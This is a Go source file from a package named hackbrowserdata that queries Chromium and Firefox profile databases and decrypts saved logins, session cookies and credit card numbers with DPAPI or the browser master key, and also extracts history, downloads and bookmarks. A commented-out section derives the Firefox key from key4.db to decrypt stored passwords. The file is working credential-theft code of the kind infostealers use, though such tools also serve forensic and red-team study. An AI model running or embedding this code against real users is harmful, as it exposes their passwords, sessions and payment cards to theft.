package hackbrowserdata

import (
	"database/sql"
	"fmt"
	"log"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"github.com/tidwall/gjson"

	"github.com/moond4rk/hack-browser-data/internal/decrypt"
	"github.com/moond4rk/hack-browser-data/utils"
)

var (
	queryChromiumCredit   = `SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards`
	queryChromiumLogin    = `SELECT origin_url, username_value, password_value, date_created FROM logins`
	queryChromiumHistory  = `SELECT url, title, visit_count, last_visit_time FROM urls`
	queryChromiumDownload = `SELECT target_path, tab_url, total_bytes, start_time, end_time, mime_type FROM downloads`
	queryChromiumCookie   = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
	queryFirefoxHistory   = `SELECT id, url, last_visit_date, title, visit_count FROM moz_places`
	queryFirefoxDownload  = `SELECT place_id, GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id`
	queryFirefoxBookMarks = `SELECT id, fk, type, dateAdded, title FROM moz_bookmarks`
	queryFirefoxCookie    = `SELECT name, value, host, path, creationTime, expiry, isSecure, isHttpOnly FROM moz_cookies`
	queryMetaData         = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
	queryNssPrivate       = `SELECT a11, a102 from nssPrivate`
	closeJournalMode      = `PRAGMA journal_mode=off`
)

type BrowsingData interface {
	parse(itemer Itemer, masterKey []byte) error
}

type WebkitPassword []loginData

func (wp *WebkitPassword) parse(itemer Itemer, masterKey []byte) error {
	loginDB, err := sql.Open("sqlite3", itemer.FileName(Chrome))
	if err != nil {
		return err
	}
	defer loginDB.Close()

	rows, err := loginDB.Query(queryChromiumLogin)
	if err != nil {
		return err
	}
	defer rows.Close()

	for rows.Next() {
		var (
			url, username string
			pwd, password []byte
			create        int64
		)
		err = rows.Scan(&url, &username, &pwd, &create)
		if err != nil {
			log.Println(err)
		}
		login := loginData{
			UserName:    username,
			encryptPass: pwd,
			LoginUrl:    url,
		}
		if len(pwd) > 0 {
			if masterKey == nil {
				password, err = decrypt.DPAPI(pwd)
			} else {
				password, err = decrypt.ChromePass(masterKey, pwd)
			}
		}
		if err != nil {
			fmt.Printf("%s have empty password %s\n", login.LoginUrl, err.Error())
		}
		if create > time.Now().Unix() {
			login.CreateDate = utils.TimeEpochFormat(create)
		} else {
			login.CreateDate = utils.TimeStampFormat(create)
		}
		login.Password = string(password)
		*wp = append(*wp, login)
	}
	return nil
}

type WebkitCookie []cookie

func (wc *WebkitCookie) parse(itemer Itemer, masterKey []byte) error {
	cookieDB, err := sql.Open("sqlite3", itemer.FileName(Chrome))
	if err != nil {
		return err
	}
	defer cookieDB.Close()
	rows, err := cookieDB.Query(queryChromiumCookie)
	if err != nil {
		return err
	}
	defer rows.Close()
	for rows.Next() {
		var (
			key, host, path                               string
			isSecure, isHTTPOnly, hasExpire, isPersistent int
			createDate, expireDate                        int64
			value, encryptValue                           []byte
		)
		if err = rows.Scan(&key, &encryptValue, &host, &path, &createDate, &expireDate, &isSecure, &isHTTPOnly, &hasExpire, &isPersistent); err != nil {
			fmt.Println(err)
		}

		cookie := cookie{
			KeyName:      key,
			Host:         host,
			Path:         path,
			encryptValue: encryptValue,
			IsSecure:     utils.IntToBool(isSecure),
			IsHTTPOnly:   utils.IntToBool(isHTTPOnly),
			HasExpire:    utils.IntToBool(hasExpire),
			IsPersistent: utils.IntToBool(isPersistent),
			CreateDate:   utils.TimeEpochFormat(createDate),
			ExpireDate:   utils.TimeEpochFormat(expireDate),
		}
		// TODO: replace DPAPI
		if masterKey == nil {
			value, err = decrypt.DPAPI(encryptValue)
			if err != nil {

			}
		} else {
			value, err = decrypt.ChromePass(masterKey, encryptValue)
			if err != nil {

			}
		}
		cookie.Value = string(value)
		*wc = append(*wc, cookie)
	}
	return nil
}

type WebkitBookmark []bookmark

func (wb *WebkitBookmark) parse(itemer Itemer, masterKey []byte) error {
	bookmarks, err := utils.ReadFile(itemer.FileName(Chrome))
	if err != nil {
		return err
	}
	r := gjson.Parse(bookmarks)
	if r.Exists() {
		roots := r.Get("roots")
		roots.ForEach(func(key, value gjson.Result) bool {
			getBookmarkChildren(value, wb)
			return true
		})
	}
	return nil
}

func getBookmarkChildren(value gjson.Result, wb *WebkitBookmark) (children gjson.Result) {
	const (
		bookmarkID       = "id"
		bookmarkAdded    = "date_added"
		bookmarkUrl      = "url"
		bookmarkName     = "name"
		bookmarkType     = "type"
		bookmarkChildren = "children"
	)
	nodeType := value.Get(bookmarkType)
	bm := bookmark{
		ID:        value.Get(bookmarkID).Int(),
		Name:      value.Get(bookmarkName).String(),
		URL:       value.Get(bookmarkUrl).String(),
		DateAdded: utils.TimeEpochFormat(value.Get(bookmarkAdded).Int()),
	}
	children = value.Get(bookmarkChildren)
	if nodeType.Exists() {
		bm.Type = nodeType.String()
		*wb = append(*wb, bm)
		if children.Exists() && children.IsArray() {
			for _, v := range children.Array() {
				children = getBookmarkChildren(v, wb)
			}
		}
	}
	return children
}

type WebkitHistory []history

func (wh *WebkitHistory) parse(itemer Itemer, masterKey []byte) error {
	historyDB, err := sql.Open("sqlite3", itemer.FileName(Chrome))
	if err != nil {
		return err
	}
	defer historyDB.Close()
	rows, err := historyDB.Query(queryChromiumHistory)
	if err != nil {
		return err
	}
	defer rows.Close()
	for rows.Next() {
		var (
			url, title    string
			visitCount    int
			lastVisitTime int64
		)
		// TODO: handle rows error
		if err := rows.Scan(&url, &title, &visitCount, &lastVisitTime); err != nil {
			fmt.Println(err)
		}
		data := history{
			Url:           url,
			Title:         title,
			VisitCount:    visitCount,
			LastVisitTime: utils.TimeEpochFormat(lastVisitTime),
		}
		*wh = append(*wh, data)
	}
	return nil
}

type WebkitCreditCard []card

func (wc *WebkitCreditCard) parse(itemer Itemer, masterKey []byte) error {
	creditDB, err := sql.Open("sqlite3", itemer.FileName(Chrome))
	if err != nil {
		return err
	}
	defer creditDB.Close()
	rows, err := creditDB.Query(queryChromiumCredit)
	if err != nil {
		return err
	}
	defer rows.Close()
	for rows.Next() {
		var (
			name, month, year, guid string
			value, encryptValue     []byte
		)
		if err := rows.Scan(&guid, &name, &month, &year, &encryptValue); err != nil {
			fmt.Println(err)
		}
		creditCardInfo := card{
			GUID:            guid,
			Name:            name,
			ExpirationMonth: month,
			ExpirationYear:  year,
		}
		if masterKey == nil {
			value, err = decrypt.DPAPI(encryptValue)
			if err != nil {
				fmt.Println(err)
			}
		} else {
			value, err = decrypt.ChromePass(masterKey, encryptValue)
			if err != nil {
				fmt.Println(err)
			}
		}
		creditCardInfo.CardNumber = string(value)
		*wc = append(*wc, creditCardInfo)
	}
	return nil
}

type WebkitDownload []download

func (wd *WebkitDownload) parse(itemer Itemer, masterKey []byte) error {
	historyDB, err := sql.Open("sqlite3", itemer.FileName(Chrome))
	if err != nil {
		return err
	}
	defer historyDB.Close()
	rows, err := historyDB.Query(queryChromiumDownload)
	if err != nil {
		return err
	}
	defer rows.Close()
	for rows.Next() {
		var (
			targetPath, tabUrl, mimeType   string
			totalBytes, startTime, endTime int64
		)
		if err := rows.Scan(&targetPath, &tabUrl, &totalBytes, &startTime, &endTime, &mimeType); err != nil {
			fmt.Println(err)
		}
		data := download{
			TargetPath: targetPath,
			Url:        tabUrl,
			TotalBytes: totalBytes,
			StartTime:  utils.TimeEpochFormat(startTime),
			EndTime:    utils.TimeEpochFormat(endTime),
			MimeType:   mimeType,
		}
		*wd = append(*wd, data)
	}
	return nil
}

type GeckoPassword []loginData

// func (g *GeckoPassword) parse(itemer Itemer, masterKey []byte) error {
// 	globalSalt, metaBytes, nssA11, nssA102, err := getFirefoxDecryptKey()
// 	if err != nil {
// 		return err
// 	}
// 	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
// 	metaPBE, err := decrypt.NewASN1PBE(metaBytes)
// 	if err != nil {
// 		log.Error("decrypt meta data failed", err)
// 		return err
// 	}
// 	// default master password is empty
// 	var masterPwd []byte
// 	k, err := metaPBE.Decrypt(globalSalt, masterPwd)
// 	if err != nil {
// 		log.Error("decrypt firefox meta bytes failed", err)
// 		return err
// 	}
// 	if bytes.Contains(k, []byte("password-check")) {
// 		log.Debug("password-check success")
// 		m := bytes.Compare(nssA102, keyLin)
// 		if m == 0 {
// 			nssPBE, err := decrypt.NewASN1PBE(nssA11)
// 			if err != nil {
// 				log.Error("decode firefox nssA11 bytes failed", err)
// 				return err
// 			}
// 			finallyKey, err := nssPBE.Decrypt(globalSalt, masterPwd)
// 			finallyKey = finallyKey[:24]
// 			if err != nil {
// 				log.Error("get firefox finally key failed")
// 				return err
// 			}
// 			allLogins, err := getFirefoxLoginData()
// 			if err != nil {
// 				return err
// 			}
// 			for _, v := range allLogins {
// 				userPBE, err := decrypt.NewASN1PBE(v.encryptUser)
// 				if err != nil {
// 					log.Error("decode firefox user bytes failed", err)
// 				}
// 				pwdPBE, err := decrypt.NewASN1PBE(v.encryptPass)
// 				if err != nil {
// 					log.Error("decode firefox password bytes failed", err)
// 				}
// 				user, err := userPBE.Decrypt(finallyKey, masterPwd)
// 				if err != nil {
// 					log.Error(err)
// 				}
// 				pwd, err := pwdPBE.Decrypt(finallyKey, masterPwd)
// 				if err != nil {
// 					log.Error(err)
// 				}
// 				log.Debug("decrypt firefox success")
// 				p.logins = append(p.logins, loginData{
// 					LoginUrl:   v.LoginUrl,
// 					UserName:   string(decrypt.PKCS5UnPadding(user)),
// 					Password:   string(decrypt.PKCS5UnPadding(pwd)),
// 					CreateDate: v.CreateDate,
// 				})
// 			}
// 		}
// 	}
// 	return nil
// }

// func getFirefoxDecryptKey() (item1, item2, a11, a102 []byte, err error) {
// 	var (
// 		keyDB   *sql.DB
// 		pwdRows *sql.Rows
// 		nssRows *sql.Rows
// 	)
// 	keyDB, err = sql.Open("sqlite3", FirefoxKey4File)
// 	if err != nil {
// 		log.Error(err)
// 		return nil, nil, nil, nil, err
// 	}
// 	defer func() {
// 		if err := keyDB.Close(); err != nil {
// 			log.Error(err)
// 		}
// 	}()
//
// 	pwdRows, err = keyDB.Query(queryMetaData)
// 	defer func() {
// 		if err := pwdRows.Close(); err != nil {
// 			log.Debug(err)
// 		}
// 	}()
// 	for pwdRows.Next() {
// 		if err := pwdRows.Scan(&item1, &item2); err != nil {
// 			log.Error(err)
// 			continue
// 		}
// 	}
// 	if err != nil {
// 		log.Error(err)
// 	}
// 	nssRows, err = keyDB.Query(queryNssPrivate)
// 	defer func() {
// 		if err := nssRows.Close(); err != nil {
// 			log.Debug(err)
// 		}
// 	}()
// 	for nssRows.Next() {
// 		if err := nssRows.Scan(&a11, &a102); err != nil {
// 			log.Debug(err)
// 		}
// 	}
// 	return item1, item2, a11, a102, nil
// }

type GeckoCookie map[string][]cookie

type GeckoBookmark []bookmark

type GeckoHistory []history

type GeckoCard []card

type GeckoDownload []download

type (
	loginData struct {
		UserName    string
		encryptPass []byte
		encryptUser []byte
		Password    string
		LoginUrl    string
		CreateDate  time.Time
	}
	bookmark struct {
		ID        int64
		Name      string
		Type      string
		URL       string
		DateAdded time.Time
	}
	cookie struct {
		Host         string
		Path         string
		KeyName      string
		encryptValue []byte
		Value        string
		IsSecure     bool
		IsHTTPOnly   bool
		HasExpire    bool
		IsPersistent bool
		CreateDate   time.Time
		ExpireDate   time.Time
	}
	history struct {
		Title         string
		Url           string
		VisitCount    int
		LastVisitTime time.Time
	}
	download struct {
		TargetPath string
		Url        string
		TotalBytes int64
		StartTime  time.Time
		EndTime    time.Time
		MimeType   string
	}
	card struct {
		GUID            string
		Name            string
		ExpirationYear  string
		ExpirationMonth string
		CardNumber      string
	}
)
